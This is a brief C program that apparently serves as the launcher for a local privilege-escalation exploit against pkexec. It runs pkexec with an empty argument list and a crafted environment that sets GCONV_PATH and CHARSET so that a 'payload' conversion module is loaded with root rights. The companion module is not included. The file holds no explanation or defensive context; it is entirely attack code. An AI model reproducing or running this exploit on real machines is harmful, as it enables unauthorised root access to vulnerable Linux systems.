#include <stdlib.h>
#include <unistd.h>

int main() {
	char* new_argv[] = { NULL };
	char* new_envp[] = { "payload", "PATH=GCONV_PATH=.", "SHELL=/usr/bin/ls", "CHARSET=payload", NULL };
	execve("/usr/bin/pkexec", new_argv, new_envp);
	return 0;
}
